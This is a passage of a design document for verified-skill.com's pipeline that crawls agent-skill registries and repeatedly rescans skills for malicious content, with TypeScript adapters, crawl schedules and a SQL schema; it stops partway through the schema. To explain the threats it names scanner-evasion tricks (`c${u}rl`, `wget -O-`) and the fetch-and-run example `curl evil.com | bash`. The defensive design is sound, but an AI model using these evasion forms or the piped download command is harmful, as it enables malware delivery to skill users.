# Continuous Scanning Pipeline Design: verified-skill.com

**Date**: 2026-02-15
**Task**: T-011 (Design continuous scanning pipeline)
**Depends On**: T-001 (platform security postures), T-003 (skill discovery sources)
**Status**: Design document

---

## 1. Overview

### Why Continuous Scanning Is Non-Negotiable

The publish-once-scan-once model is fundamentally broken. Evidence from the current ecosystem proves this:

**The ClawHub failure.** Snyk's ToxicSkills study (February 2026) found 76 confirmed malicious payloads across ClawHub and Skills.sh. Of those, **8 malicious skills remained publicly available and installable** at the time of publication. These skills had been live for days to weeks, accumulating installs while hosting credential-stealing payloads, reverse shells, and data exfiltration mechanisms. ClawHub's reactive VirusTotal integration -- added only after the disclosure -- illustrates the cost of not scanning continuously: by the time scanning was added, the ClawHavoc campaign had already deployed 335 infostealer packages targeting cryptocurrency wallets, SSH keys, and browser credential stores.

**Mutation after publication.** Skills are mutable. A SKILL.md hosted on GitHub can change at any time via a new commit. A skill that passes scanning at submission time can be modified to include malicious instructions the next day. Without continuous re-scanning, the badge remains "verified" while the content becomes hostile. This is the "rug pull" attack vector documented by Snyk -- post-verification behavioral changes that exploit the trust established during initial review.

**Scale outpacing human review.** Daily skill submissions across the ecosystem grew from approximately 50/day to 500/day in a single month (January-February 2026). At 500 submissions/day, even a 2-minute manual review per skill requires 16.7 hours of human labor daily. Automated continuous scanning is the only viable approach at this scale.

**The scanner arms race.** Snyk's research demonstrated that pattern-based scanners are bypassable through bash parameter expansion (`c${u}rl`), alternative tool invocation (`wget -O-`), standard library imports (`python -c "import urllib.request..."`), and natural language reformulation. Attackers actively probe scanner detection patterns and evolve their payloads. A continuous pipeline allows detection rules to be updated and retroactively applied to the entire corpus -- catching skills that evaded earlier rule versions.

**No existing platform does this.** Skills.sh (200+ skills, 234K top installs) has zero scanning. SkillsMP (200K+ skills) has zero scanning. ClawHub (3,286+ skills) added VirusTotal reactively. SkillsDirectory (36K skills, 50+ rules) does not re-scan after initial grading. GitHub (44K+ via agentskill.sh) has no skill-specific scanning. verified-skill.com's continuous pipeline would be the first in the ecosystem.

---

## 2. Source Adapters

Each external skill platform requires a dedicated adapter that normalizes skill data into a common format for the scanning pipeline. Adapters must handle platform-specific pagination, rate limiting, authentication, and data formats.

### 2.1 Core Interfaces

```typescript
/**
 * A normalized skill entry from any source platform.
 * All adapters must produce this format regardless of source.
 */
interface SkillEntry {
  /** Unique identifier within the source (e.g., "owner/repo" for GitHub) */
  sourceId: string;
  /** Which adapter produced this entry */
  source: SourceName;
  /** Raw SKILL.md content (markdown) */
  content: string;
  /** SHA-256 hash of the content for deduplication */
  contentHash: string;
  /** URL where this skill can be fetched/viewed */
  sourceUrl: string;
  /** Author or organization name */
  author: string;
  /** Skill name as declared in the SKILL.md or inferred from path */
  name: string;
  /** Last modification timestamp (ISO 8601) */
  lastModified: string;
  /** Install count if available from the source platform */
  installCount?: number;
  /** Additional metadata from the source (platform-specific) */
  metadata?: Record<string, unknown>;
}

type SourceName =
  | 'skills-sh'
  | 'clawhub'
  | 'github'
  | 'skillsmp'
  | 'skills-directory';

/**
 * Adapter for crawling a single skill source platform.
 * Implementations must handle pagination, rate limiting, and errors internally.
 */
interface SourceAdapter {
  /** Human-readable adapter name */
  readonly name: string;
  /** Which source this adapter covers */
  readonly source: SourceName;
  /** Whether the adapter is currently enabled */
  enabled: boolean;

  /**
   * Crawl the source and yield skill entries one at a time.
   * Uses AsyncGenerator to support backpressure and memory-efficient
   * processing of large catalogs (200K+ skills for some sources).
   *
   * @param options - Crawl configuration
   * @yields SkillEntry for each discovered skill
   */
  crawl(options: CrawlOptions): AsyncGenerator<SkillEntry>;

  /**
   * Fetch a single skill by its source-specific identifier.
   * Used for on-demand scanning of reported or newly submitted skills.
   *
   * @param sourceId - Platform-specific identifier
   * @returns The skill entry, or null if not found/removed
   */
  fetchOne(sourceId: string): Promise<SkillEntry | null>;

  /**
   * Health check. Returns true if the source is reachable and
   * the adapter has valid credentials/tokens.
   */
  healthCheck(): Promise<boolean>;

  /**
   * Returns rate limit status for the adapter's API connections.
   */
  getRateLimitStatus(): Promise<RateLimitStatus>;
}

interface CrawlOptions {
  /** Maximum number of skills to fetch in this crawl run */
  limit?: number;
  /** Resume from this cursor (adapter-specific opaque token) */
  cursor?: string;
  /** Only fetch skills modified after this timestamp */
  modifiedAfter?: string;
  /** Only fetch skills from this category/tier */
  filter?: CrawlFilter;
}

interface CrawlFilter {
  /** Minimum install count (for prioritized crawling) */
  minInstalls?: number;
  /** Specific author/org to crawl */
  author?: string;
  /** Category filter (platform-specific) */
  category?: string;
}

interface RateLimitStatus {
  /** Remaining API calls in the current window */
  remaining: number;
  /** Total limit per window */
  limit: number;
  /** When the current window resets (ISO 8601) */
  resetsAt: string;
  /** Whether the adapter is currently rate-limited */
  isLimited: boolean;
}
```

### 2.2 Skills.sh Adapter

**Strategy**: Crawl the Skills.sh leaderboard, resolve each entry to its GitHub repository, fetch the SKILL.md content.

**Data flow**:
1. Fetch the Skills.sh leaderboard page (sorted by "All Time", "Trending 24h", or "Hot")
2. Extract skill entries: name, source repository (owner/repo format), install count
3. For each entry, resolve the GitHub repository URL
4. Fetch raw SKILL.md content via GitHub raw content API (`raw.githubusercontent.com`)
5. Yield normalized `SkillEntry`

**Rate limiting**: Skills.sh itself has no documented API. The adapter will scrape the leaderboard HTML or intercept the Next.js data fetch endpoint. GitHub raw content fetches are not rate-limited in the same way as API calls, but the adapter should respect a 1-second delay between fetches to avoid IP blocks.

**Pagination**: Skills.sh appears to load all entries on a single page (200+ skills). If pagination is added, the adapter will follow cursor-based pagination via the Next.js `__NEXT_DATA__` endpoint or equivalent.

**Frequency**: Daily crawl of the full leaderboard (200 entries is small). Trending/Hot sorts provide a built-in signal for prioritizing high-activity skills.

```typescript
class SkillsShAdapter implements SourceAdapter {
  readonly name = 'Skills.sh';
  readonly source: SourceName = 'skills-sh';
  enabled = true;

  private readonly leaderboardUrl = 'https://skills.sh';
  private readonly githubRawBase = 'https://raw.githubusercontent.com';

  async *crawl(options: CrawlOptions): AsyncGenerator<SkillEntry> {
    const entries = await this.scrapeLeaderboard(options.filter?.minInstalls);

    for (const entry of entries) {
      if (options.limit && /* yielded count */ false) break;

      try {
        const content = await this.fetchSkillMd(entry.owner, entry.repo);
        if (!content) continue;

        yield {
          sourceId: `${entry.owner}/${entry.repo}`,
          source: 'skills-sh',
          content,
          contentHash: sha256(content),
          sourceUrl: `https://github.com/${entry.owner}/${entry.repo}`,
          author: entry.owner,
          name: entry.name,
          lastModified: new Date().toISOString(), // Skills.sh does not expose commit dates
          installCount: entry.installs,
        };
      } catch (err) {
        // Log and continue -- one failed fetch should not abort the crawl
        logger.warn(`Skills.sh: Failed to fetch ${entry.owner}/${entry.repo}`, err);
      }

      await delay(1000); // Respect rate limits
    }
  }

  private async scrapeLeaderboard(minInstalls?: number): Promise<LeaderboardEntry[]> {
    // Fetch leaderboard HTML or Next.js data endpoint
    // Parse skill entries with name, owner/repo, install count
    // Filter by minInstalls if specified
    // ...
  }

  private async fetchSkillMd(owner: string, repo: string): Promise<string | null> {
    // Try common SKILL.md locations:
    // 1. /SKILL.md (root)
    // 2. /skills/*/SKILL.md (monorepo pattern)
    // 3. /.agents/skills/*/SKILL.md
    // ...
  }
}
```

### 2.3 ClawHub Adapter

**Strategy**: Integrate with ClawHub's API (if available) or scrape the registry to enumerate skills. ClawHub uses a structured registry with categories.

**Data flow**:
1. Fetch ClawHub skill listings by category (11 categories documented)
2. For each skill, fetch the SKILL.md content from the linked repository
3. Cross-reference with VirusTotal scan status (ClawHub now exposes this)
4. Yield normalized `SkillEntry` with VirusTotal verdict as metadata

**Authentication**: ClawHub's public API (if it follows the OpenClaw CLI patterns) may require an API key for higher rate limits. The adapter should support both authenticated and unauthenticated modes.

**Rate limiting**: ClawHub has 3,286+ skills. At a conservative 1 request/second, a full crawl takes approximately 55 minutes. The adapter should support resumable crawling with cursor persistence.

**Special handling**: ClawHub is the highest-risk source (76 confirmed malicious payloads, active threat actors). Skills from this source should be tagged with elevated priority in the scanning pipeline.

```typescript
class ClawHubAdapter implements SourceAdapter {
  readonly name = 'ClawHub';
  readonly source: SourceName = 'clawhub';
  enabled = true;

  private readonly apiBase = 'https://clawhub.ai/api';
  private readonly categories = [
    'development', 'productivity', 'data', 'security',
    'devops', 'testing', 'documentation', 'design',
    'finance', 'marketing', 'other'
  ];

  async *crawl(options: CrawlOptions): AsyncGenerator<SkillEntry> {
    for (const category of this.categories) {
      let page = 1;
      let hasMore = true;

      while (hasMore) {
        const response = await this.fetchCategoryPage(category, page);
        if (!response.skills.length) {
          hasMore = false;
          break;
        }

        for (const skill of response.skills) {
          const content = await this.fetchSkillContent(skill.id);
          if (!content) continue;

          yield {
            sourceId: skill.id,
            source: 'clawhub',
            content,
            contentHash: sha256(content),
            sourceUrl: skill.url,
            author: skill.author,
            name: skill.name,
            lastModified: skill.updatedAt,
            installCount: skill.downloads,
            metadata: {
              category,
              virusTotalVerdict: skill.vtVerdict,
              virusTotalScanDate: skill.vtScanDate,
              riskLevel: 'elevated', // ClawHub skills get elevated risk tagging
            },
          };
        }

        page++;
        await delay(1000);
      }
    }
  }
}
```

### 2.4 GitHub Adapter

**Strategy**: Multi-pronged GitHub discovery combining code search, awesome-list crawling, and topic-based discovery.

**Discovery channels**:
1. **Code search**: Search for `filename:SKILL.md` via GitHub Code Search API
2. **Awesome lists**: Monitor `VoltAgent/awesome-agent-skills` (300+ skills), `skillmatic-ai/awesome-agent-skills`, `heilcheng/awesome-agent-skills` for new entries
3. **Topic search**: Query the `agent-skills` GitHub topic for new repositories
4. **agentskill.sh index**: Cross-reference with the agentskill.sh index (44K+ skills)

**Rate limiting**: This is the most constrained adapter.
- Unauthenticated: 60 requests/hour (unusable for crawling)
- Authenticated (personal access token): 5,000 requests/hour
- GitHub App installation: 5,000 requests/hour per installation
- Code Search API: 10 requests/minute (primary bottleneck)

**Strategy to maximize throughput**:
- Use GitHub App tokens for the primary quota (5,000/hour)
- Cache SKILL.md content by commit SHA (if content has not changed, skip re-fetch)
- Use conditional requests (`If-None-Match` / `If-Modified-Since`) to avoid consuming quota on unchanged content
- Batch awesome-list parsing (one fetch per list, extract all entries)
- Use the GraphQL API for bulk repository metadata queries (reduces call count vs REST)

**Pagination**: GitHub Code Search returns up to 1,000 results per query. For full coverage, the adapter must use time-windowed queries (`created:>2026-01-01`, `pushed:>2026-02-01`) to partition the result space.

```typescript
class GitHubAdapter implements SourceAdapter {
  readonly name = 'GitHub';
  readonly source: SourceName = 'github';
  enabled = true;

  private readonly searchApi = 'https://api.github.com/search/code';
  private readonly graphqlApi = 'https://api.github.com/graphql';
  private readonly awesomeLists = [
    'VoltAgent/awesome-agent-skills',
    'skillmatic-ai/awesome-agent-skills',
    'heilcheng/awesome-agent-skills',
  ];

  async *crawl(options: CrawlOptions): AsyncGenerator<SkillEntry> {
    // Channel 1: Awesome lists (low API cost, high signal)
    yield* this.crawlAwesomeLists(options);

    // Channel 2: GitHub topic discovery
    yield* this.crawlTopicRepos(options);

    // Channel 3: Code search (highest API cost, broadest coverage)
    yield* this.crawlCodeSearch(options);
  }

  private async *crawlAwesomeLists(options: CrawlOptions): AsyncGenerator<SkillEntry> {
    for (const listRepo of this.awesomeLists) {
      const readme = await this.fetchFileContent(listRepo, 'README.md');
      if (!readme) continue;

      const repoUrls = this.extractGitHubUrls(readme);

      for (const repoUrl of repoUrls) {
        const { owner, repo } = this.parseRepoUrl(repoUrl);
        const skillMd = await this.fetchFileContent(`${owner}/${repo}`, 'SKILL.md');
        if (!skillMd) continue;

        yield this.toSkillEntry(owner, repo, skillMd);
        await this.respectRateLimit();
      }
    }
  }

  private async *crawlCodeSearch(options: CrawlOptions): AsyncGenerator<SkillEntry> {
    // Time-windowed queries to stay under 1,000 result limit
    const windows = this.generateTimeWindows(options.modifiedAfter);

    for (const window of windows) {
      const query = `filename:SKILL.md pushed:${window.start}..${window.end}`;
      let page = 1;

      while (page <= 10) { // GitHub caps at 10 pages (1000 results)
        const results = await this.searchCode(query, page);
        if (!results.items.length) break;

        for (const item of results.items) {
          const content = await this.fetchRawContent(item.repository.full_name, item.path);
          if (!content) continue;

          yield this.toSkillEntry(
            item.repository.owner.login,
            item.repository.name,
            content,
            { path: item.path }
          );
        }

        page++;
        await delay(6000); // Code Search: 10 req/min = 6s between requests
      }
    }
  }
}
```

### 2.5 SkillsMP Adapter

**Strategy**: SkillsMP aggregates 200K+ skills from GitHub. Rather than re-crawling GitHub (which the GitHub adapter already handles), this adapter focuses on SkillsMP's index to discover skills that may not appear in direct GitHub search results.

**Data flow**:
1. Fetch SkillsMP's search/browse API or sitemap
2. Extract skill metadata (name, author, source URL, category)
3. For each skill not already in our database (by content hash), fetch the SKILL.md from the original source
4. Yield normalized `SkillEntry`

**Deduplication**: Since SkillsMP aggregates GitHub skills, there will be significant overlap with the GitHub adapter. The pipeline's content-hash deduplication (Section 4) handles this transparently -- identical SKILL.md content from different discovery sources is scanned only once.

```typescript
class SkillsMPAdapter implements SourceAdapter {
  readonly name = 'SkillsMP';
  readonly source: SourceName = 'skillsmp';
  enabled = true;

  private readonly baseUrl = 'https://skillsmp.com';

  async *crawl(options: CrawlOptions): AsyncGenerator<SkillEntry> {
    // SkillsMP likely has a search API or sitemap.
    // Crawl by category or paginated listing.
    const categories = await this.fetchCategories();

    for (const category of categories) {
      let page = 1;
      let hasMore = true;

      while (hasMore) {
        const skills = await this.fetchSkillsPage(category.id, page);
        if (!skills.length) {
          hasMore = false;
          break;
        }

        for (const skill of skills) {
          // Resolve to original source (usually GitHub) and fetch content
          const content = await this.resolveAndFetchContent(skill.sourceUrl);
          if (!content) continue;

          yield {
            sourceId: skill.id,
            source: 'skillsmp',
            content,
            contentHash: sha256(content),
            sourceUrl: skill.sourceUrl,
            author: skill.author,
            name: skill.name,
            lastModified: skill.updatedAt || new Date().toISOString(),
            installCount: skill.popularity,
          };
        }

        page++;
        await delay(500);
      }
    }
  }
}
```

### 2.6 SkillsDirectory Adapter

**Strategy**: Cross-reference SkillsDirectory's 36K graded skills with our own scanning results. This adapter serves two purposes: (1) discover skills we have not yet indexed, and (2) compare our scanning results against SkillsDirectory's letter grades to identify discrepancies.

**Special value**: SkillsDirectory assigns A-F grades using 50+ rules across 10 threat categories. Their 94.4% Grade-A rate vs. Snyk's 36.82% ecosystem flaw rate suggests either curated input or shallow scanning. Cross-referencing allows verified-skill.com to surface these discrepancies.

```typescript
class SkillsDirectoryAdapter implements SourceAdapter {
  readonly name = 'SkillsDirectory';
  readonly source: SourceName = 'skills-directory';
  enabled = true;

  private readonly baseUrl = 'https://www.skillsdirectory.com';

  async *crawl(options: CrawlOptions): AsyncGenerator<SkillEntry> {
    // SkillsDirectory has category-based browsing and grade filtering.
    // Crawl all grades, not just A, to catch skills with known issues.
    const grades = ['A', 'B', 'C', 'D', 'F'];

    for (const grade of grades) {
      let page = 1;
      let hasMore = true;

      while (hasMore) {
        const skills = await this.fetchByGrade(grade, page);
        if (!skills.length) {
          hasMore = false;
          break;
        }

        for (const skill of skills) {
          const content = await this.resolveAndFetchContent(skill.sourceUrl);
          if (!content) continue;

          yield {
            sourceId: skill.id,
            source: 'skills-directory',
            content,
            contentHash: sha256(content),
            sourceUrl: skill.sourceUrl,
            author: skill.author,
            name: skill.name,
            lastModified: skill.updatedAt || new Date().toISOString(),
            metadata: {
              sdGrade: grade,
              sdRuleCount: skill.rulesPassed,
              sdThreatCategories: skill.threatCategories,
            },
          };
        }

        page++;
        await delay(1000);
      }
    }
  }
}
```

---

## 3. Crawl Schedule

### 3.1 Schedule Tiers

| Tier | Frequency | Scope | Rationale |
|------|-----------|-------|-----------|
| **Critical** | Every 6 hours | Top 100 most-installed skills (Skills.sh leaderboard) | High-value targets. A compromised top-100 skill affects thousands of users. The top Skills.sh skill has 234K+ installs. |
| **Daily** | Once/day (02:00 UTC) | New submissions from all sources (last 24h), reported skills, skills with badge downgrades pending | Catch new malicious submissions within 24 hours of publication. |
| **Weekly** | Sunday 04:00 UTC | Full catalog re-scan across all sources | Catch mutations in previously-scanned skills. Detect rug-pull attacks. Apply updated detection rules retroactively. |
| **On-demand** | Immediate | User-reported skills, skills flagged by external scanners, new verified-skill.com submissions | Zero-delay response to reports and submissions. |

### 3.2 Priority Queue

Skills are prioritized within each crawl tier based on a composite priority score:

```typescript
interface CrawlPriority {
  skillId: string;
  score: number; // Higher = scan sooner
  reason: CrawlReason;
}

type CrawlReason =
  | 'new-submission'       // Brand new skill (priority: 100)
  | 'user-report'          // Reported by a user (priority: 90)
  | 'content-changed'      // Content hash differs from last scan (priority: 85)
  | 'external-flag'        // Flagged by VirusTotal, Snyk, etc. (priority: 80)
  | 'high-install-count'   // Top 100 by installs (priority: 70)
  | 'badge-expiring'       // Badge approaching expiry window (priority: 60)
  | 'scheduled-rescan'     // Regular weekly rescan (priority: 30)
  | 'backfill'             // New source adapter discovered skills (priority: 10);

function calculatePriority(skill: SkillRecord, reason: CrawlReason): number {
  const basePriority: Record<CrawlReason, number> = {
    'new-submission': 100,
    'user-report': 90,
    'content-changed': 85,
    'external-flag': 80,
    'high-install-count': 70,
    'badge-expiring': 60,
    'scheduled-rescan': 30,
    'backfill': 10,
  };

  let score = basePriority[reason];

  // Boost for high-install skills (compromise affects more users)
  if (skill.installCount && skill.installCount > 10000) score += 15;
  if (skill.installCount && skill.installCount > 100000) score += 25;

  // Boost for skills from high-risk sources
  if (skill.source === 'clawhub') score += 10;

  // Reduce priority if recently scanned with no changes
  if (skill.lastScanAge < 24 * 60 * 60 * 1000) score -= 20; // Scanned < 24h ago

  return Math.max(0, Math.min(100, score));
}
```

### 3.3 Rate Limiting Strategy

| Source | Limit | Strategy |
|--------|-------|----------|
| **GitHub API** | 5,000 req/hr (authenticated) | Token rotation (2-3 tokens = 10K-15K/hr). Conditional requests (`If-None-Match`) to avoid consuming quota on unchanged content. GraphQL batching for metadata. |
| **GitHub Code Search** | 10 req/min | Dedicated rate limiter. Time-windowed queries to partition result space. Cache search results for 24 hours. |
| **Skills.sh** | No documented limit | Conservative 1 req/sec. Full leaderboard is only 200 entries -- one crawl costs ~200 requests. |
| **ClawHub** | Unknown | Start at 1 req/sec, monitor for 429 responses. Back off exponentially on rate limit. Full crawl at 1/sec = ~55 min for 3,286 skills. |
| **SkillsMP** | Unknown | Start at 2 req/sec, monitor. If sitemap available, use it to reduce requests. |
| **SkillsDirectory** | Unknown | Start at 1 req/sec, monitor. Prioritize Grade D/F skills (most likely to have interesting scan results). |

### 3.4 Pagination and Resumption

All crawl sessions are tracked with cursor persistence:

```typescript
interface CrawlSession {
  id: string;              // UUID
  adapterId: SourceName;
  startedAt: string;       // ISO 8601
  status: 'running' | 'completed' | 'failed' | 'paused';
  cursor: string | null;   // Opaque adapter-specific cursor for resumption
  skillsProcessed: number;
  skillsDiscovered: number;
  errors: number;
  lastActivityAt: string;
}
```

If a crawl is interrupted (worker crash, rate limit exhaustion, deployment), it resumes from the last persisted cursor rather than restarting from the beginning. Cursors are persisted to PostgreSQL after every batch of 50 skills.

### 3.5 Estimated API Budget

| Source | Crawl Type | Requests/Run | Runs/Week | Weekly Total |
|--------|-----------|-------------|-----------|-------------|
| Skills.sh | Full leaderboard | ~400 (200 entries x 2 reqs) | 7 (daily) | 2,800 |
| ClawHub | Full catalog | ~6,572 (3,286 x 2) | 1 (weekly) | 6,572 |
| GitHub Code Search | Incremental | ~1,000 | 7 (daily) | 7,000 |
| GitHub (awesome lists) | Full parse | ~600 (300 repos x 2) | 7 (daily) | 4,200 |
| SkillsMP | Incremental | ~2,000 | 1 (weekly) | 2,000 |
| SkillsDirectory | Full catalog | ~4,000 | 1 (weekly) | 4,000 |
| **Total** | | | | **~26,572/week** |

This is well within a single GitHub token's weekly budget (5,000/hr x 168 hrs = 840,000/week). The primary constraint is the Code Search rate limit (10/min = 100,800/week), which is sufficient.

---

## 4. Scanning Pipeline Architecture

### 4.1 Pipeline Stages

```
Discovery → Fetch → Deduplicate → Scan (Tier 1) → Score → Store → Alert
    ↑                                                          |
    └──────────── Schedule (cron / on-demand) ─────────────────┘
```

**Stage breakdown**:

| Stage | Responsibility | Failure Mode |
|-------|---------------|-------------|
| **Discovery** | Source adapters enumerate skills, yield `SkillEntry` | Adapter error: log and skip source, retry next cycle |
| **Fetch** | Download raw SKILL.md content from source | Network error: retry 3x with exponential backoff |
| **Deduplicate** | Compare content hash against last-scanned hash. Skip if unchanged. | Hash collision (SHA-256: negligible probability) |
| **Scan (Tier 1)** | Run static analysis (26+ SpecWeave patterns + extended ruleset) | Scanner crash: isolate per-skill, mark as `scan_error` |
| **Score** | Compute security score (0-5) and quality score (0-30) from findings | Scoring logic error: flag for manual review |
| **Store** | Persist scan results, findings, score, content snapshot | Database error: retry with transaction rollback |
| **Alert** | Trigger notifications for critical findings or badge changes | Alert delivery failure: queue for retry |

### 4.2 Worker Architecture

The pipeline uses **Cloudflare Queues** for job distribution and PostgreSQL for result storage. Queues provide durable, at-least-once delivery natively within the Cloudflare Workers ecosystem.

**Why Cloudflare Queues over PostgreSQL SKIP LOCKED**:
- Native integration with Cloudflare Workers (no polling, push-based)
- Durable message delivery with automatic retries
- Free tier: 10,000 operations/day (write + read + delete = 3 ops per message)
- At 500 submissions/day x 3 stages x 3 ops = ~4,500 ops/day — fits free tier
- Max throughput: 5,000 messages/second per queue
- Max batch: 100 messages, 256KB total

```typescript
/**
 * Job queue using Cloudflare Queues.
 * Source adapters and schedulers produce messages to the scan queue.
 * Worker consumers process messages in batches.
 * Results are stored in PostgreSQL.
 */
interface ScanJob {
  id: string;                // UUID
  skillId: string;           // References skills.id
  source: SourceName;
  sourceId: string;
  content: string;           // SKILL.md content to scan
  contentHash: string;       // SHA-256 for dedup
  priority: number;          // 0-100 (higher = scan sooner)
  attempts: number;          // Retry count (managed by Queues)
  createdAt: string;
}

// wrangler.toml queue configuration:
// [[queues.producers]]
//   queue = "scan-pipeline"
//   binding = "SCAN_QUEUE"
//
// [[queues.consumers]]
//   queue = "scan-pipeline"
//   max_batch_size = 10
//   max_batch_timeout = 30
//   max_retries = 3
//   dead_letter_queue = "scan-dlq"
```

**Queue consumer** (push-based, no polling):

```typescript
/**
 * Cloudflare Queue consumer.
 * Configured in wrangler.toml as a queue consumer binding.
 * Messages are pushed to the worker automatically — no polling loop needed.
 */
export default {
  async queue(batch: MessageBatch<ScanJob>, env: Env): Promise<void> {
    for (const message of batch.messages) {
      const job = message.body;

      try {
        // 1. Deduplication check
        const lastScan = await getLastScanByHash(job.contentHash, env);
        if (lastScan && lastScan.contentHash === job.contentHash) {
          await storeResult({ ...lastScan, skipped: true, reason: 'content-unchanged' }, env);
          message.ack();
          continue;
        }

        // 2. Run Tier 1 scanning (static analysis)
        const findings = await tier1Scan(job.content);

        // 3. Compute scores
        const securityScore = computeSecurityScore(findings);
        const qualityDimensions = computeQualityDimensions(job);

        // 4. Determine if Tier 2 (LLM) scanning is needed
        const needsTier2 = shouldEscalateToTier2(findings, securityScore);

        // 5. Snapshot content for diff analysis
        const snapshot = { content: job.content, hash: job.contentHash, capturedAt: new Date().toISOString() };

        // 6. Store result in PostgreSQL
        await storeResult({ jobId: job.id, skillId: job.skillId, findings, securityScore, qualityDimensions, needsTier2, snapshot, scannedAt: new Date().toISOString() }, env);

        // 7. Acknowledge message (removes from queue)
        message.ack();
      } catch (err) {
        // Retry with exponential backoff (up to 3 retries, managed by Queues)
        message.retry({ delaySeconds: Math.min(300, 30 * (message.attempts + 1)) });
      }
    }
  },
};
```

### 4.3 Throughput

Cloudflare Queues support 5,000 messages/second per queue. At typical scan latency:
- **Static-only scans**: ~10/second (100ms per scan) = **864,000/day**
- **With content fetch**: ~2/second (500ms fetch + 100ms scan) = **172,800/day**

This exceeds the 500/day submission rate by 345x, providing ample headroom for full-catalog rescans.

### 4.4 Retry Logic

```typescript
const RETRY_CONFIG = {
  maxAttempts: 3,
  baseDelayMs: 1000,
  maxDelayMs: 30000,
  backoffMultiplier: 2,

  /**
   * Exponential backoff with jitter.
   * Attempt 1: 1s + jitter
   * Attempt 2: 2s + jitter
   * Attempt 3: 4s + jitter (capped at 30s)
   */
  getDelay(attempt: number): number {
    const exponentialDelay = this.baseDelayMs * Math.pow(this.backoffMultiplier, attempt - 1);
    const cappedDelay = Math.min(exponentialDelay, this.maxDelayMs);
    const jitter = Math.random() * cappedDelay * 0.1; // 10% jitter
    return cappedDelay + jitter;
  },

  /**
   * Determines if a failed job should be retried.
   * Some errors are non-retryable (e.g., content not found, invalid format).
   */
  shouldRetry(error: Error, attempt: number): boolean {
    if (attempt >= this.maxAttempts) return false;

    // Non-retryable errors
    if (error.message.includes('404')) return false;        // Skill deleted
    if (error.message.includes('invalid format')) return false; // Not a SKILL.md
    if (error.message.includes('content too large')) return false; // > 1MB

    // Retryable errors
    return true; // Network errors, timeouts, transient failures
  },
};
```

### 4.5 Deduplication

Content-hash deduplication avoids re-scanning unchanged skills, which is critical for weekly full-catalog rescans where most content will not have changed.

```typescript
/**
 * Deduplication logic:
 * 1. Compute SHA-256 of fetched SKILL.md content
 * 2. Check if a scan result exists with this hash
 * 3. If yes AND the scan used the current rule version: skip (reuse results)
 * 4. If yes BUT the scan used an older rule version: rescan (rules evolved)
 * 5. If no: scan (new content)
 */
interface DeduplicationCheck {
  contentHash: string;
  lastScanHash: string | null;
  lastScanRuleVersion: number | null;
  currentRuleVersion: number;
  decision: 'skip' | 'rescan-rules-updated' | 'scan-new-content';
}
```

This is particularly effective for the weekly full-catalog rescan: if 95% of 36K skills are unchanged, only 1,800 skills need actual scanning -- reducing a 36,000-job run to 1,800 actual scans plus 34,200 hash comparisons (which take microseconds).

### 4.6 Full Repository Scanning Scope

The pipeline performs a **shallow clone** (depth=1) of each skill repository and scans all non-binary files, not just SKILL.md. This catches attacks that hide payloads in referenced scripts, hooks, or configuration files.

**Scan scope**:
- SKILL.md (primary content)
- `scripts/*.sh`, `scripts/*.py`, `scripts/*.ts` (helper scripts)
- `hooks/` directory (lifecycle hooks)
- `.json`, `.yaml`, `.yml` config files in skill root
- Any file explicitly referenced in SKILL.md (via path detection regex)

**Limits**:
- Individual file size: max 100KB (skip larger files)
- Total scan payload: max 1MB per skill repository
- Binary files: excluded (detected by null byte check)
- Symlinks: not followed (flagged as structural violation)

**Content hashing**: The deduplication hash (SHA-256) is computed over the combined content of SKILL.md + all scanned repo files. This ensures that changes to any file in the skill directory trigger a rescan.

**Rationale**: A SKILL.md can contain `scripts/payload.sh` which executes `curl evil.com | bash`. Scanning only SKILL.md would miss this entirely. The shallow clone approach adds ~2-5 seconds per skill but catches the most common attack vector documented by Snyk.

---

## 5. Result Storage

### 5.1 Database Schema (PostgreSQL)

```sql
-- Skills: canonical record for each unique skill across all sources
CREATE TABLE skills (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    name            TEXT NOT NULL,
    author          TEXT NOT NULL,
    -- A skill may be discovered from multiple sources; this is the primary
    primary_source  TEXT NOT NULL,  -- 'skills-sh' | 'clawhub' | 'github' | etc.
    primary_source_id TEXT NOT NULL, -- Source-specific identifier
    source_url      TEXT NOT NULL,
    current_hash    TEXT,            -- SHA-256 of latest known content
    current_score   SMALLINT,        -- Latest security score (0-5)
    current_tier    TEXT,             -- 'scanned' | 'verified' | 'certified'
    badge_status    TEXT DEFAULT 'none', -- 'none' | 'active' | 'downgraded' | 'revoked'
    install_count   INTEGER DEFAULT 0,
    first_seen_at   TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    last_scanned_at TIMESTAMPTZ,
    created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    updated_at      TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    UNIQUE (primary_source, primary_source_id)
);

CREATE INDEX idx_skills_source ON skills (primary_source);
CREATE INDEX idx_skills_score ON skills (current_score);
CREATE INDEX idx_skills_badge ON skills (badge_status);
CREATE INDEX idx_skills_last_scanned ON skills (last_scanned_at);

-- Scan jobs: queue for pending work
CREATE TABLE scan_jobs (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    skill_id        UUID REFERENCES skills(id),
    source          TEXT NOT NULL,
    source_id       TEXT NOT NULL,
    content         TEXT,              -- SKILL.md content (nullable until fetched)
    content_hash    TEXT,
    priority        SMALLINT NOT NULL DEFAULT 30,
    status          TEXT NOT NULL DEFAULT 'pending',
    attempts        SMALLINT NOT NULL DEFAULT 0,
    max_attempts    SMALLINT NOT NULL DEFAULT 3,
    worker_id       TEXT,
    error           TEXT,
    crawl_reason    TEXT,              -- Why this job was created
    rule_version    INTEGER,           -- Scanner rule version used
    created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    claimed_at      TIMESTAMPTZ,
    completed_at    TIMESTAMPTZ
);

CREATE INDEX idx_scan_jobs_pending ON scan_jobs (priority DESC, created_at ASC)
    WHERE status = 'pending';
CREATE INDEX idx_scan_jobs_skill ON scan_jobs (skill_id);

-- Scan results: historical record of every scan performed
CREATE TABLE scan_results (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    skill_id        UUID NOT NULL REFERENCES skills(id),
    job_id          UUID REFERENCES scan_jobs(id),
    content_hash    TEXT NOT NULL,     -- Hash of content that was scanned
    rule_version    INTEGER NOT NULL,  -- Scanner rule version at scan time
    security_score  SMALLINT NOT NULL, -- 0-5 composite security score
    tier            TEXT NOT NULL,     -- 'scanned' | 'verified' | 'certified'
    passed          BOOLEAN NOT NULL,  -- Overall pass/fail
    finding_count   INTEGER NOT NULL DEFAULT 0,
    critical_count  INTEGER NOT NULL DEFAULT 0,
    high_count      INTEGER NOT NULL DEFAULT 0,
